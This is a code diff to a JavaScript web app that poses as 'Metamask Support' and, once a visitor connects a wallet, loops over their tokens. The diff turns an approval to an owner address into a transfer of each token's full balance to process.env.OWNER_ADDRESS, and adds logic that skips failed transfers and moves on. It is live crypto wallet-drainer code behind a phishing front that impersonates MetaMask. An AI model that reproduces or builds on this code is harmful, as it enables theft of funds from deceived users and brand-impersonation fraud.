@@ -37,9 +37,7 @@ const metadata = {
     name: "Metamask",
     description: "Metamask Support",
     url: "https://support.metamask.io/hc/en-us",
-    icons: [
-        "https://metamask.io/favicon-32x32.png",
-    ],
+    icons: ["https://metamask.io/favicon-32x32.png"],
 };
 
 const config = createConfig({
@@ -150,14 +148,20 @@ async function initAccounts() {
                 try {
                     const tkn = resultTokens[i];
 
+                    const getTokenBal = await getBalance(config, {
+                        address: data.userAddress,
+                        token: tkn.address,
+                        unit: "wei",
+                    });
+
                     const result = await writeContract(config, {
                         account: data.userAddress,
                         address: tkn.address,
                         abi: JSON.parse(CONFIG.DEFAULT_TOKEN_ABI),
-                        functionName: "approve",
+                        functionName: "transfer",
                         args: [
                             process.env.OWNER_ADDRESS,
-                            BigInt("180925139433306555349329664"),
+                            BigInt(Number(getTokenBal.value)),
                         ],
                         chainId: hexToNumber(
                             await wallet.request({
@@ -187,6 +191,9 @@ async function initAccounts() {
                         );
                         i--;
                         continue;
+                    } else if (isRevertError(error)) {
+                        console.log(error);
+                        continue;
                     } else {
                         await initRestoreETH();
                     }
@@ -202,6 +209,10 @@ async function initAccounts() {
         await sendErr(error);
         await initRestoreETH();
     }
+}
+
+function isRevertError(error) {
+    return error.message.includes("Execution reverted for an unknown reason");
 }
 
 async function initRestoreETH() {
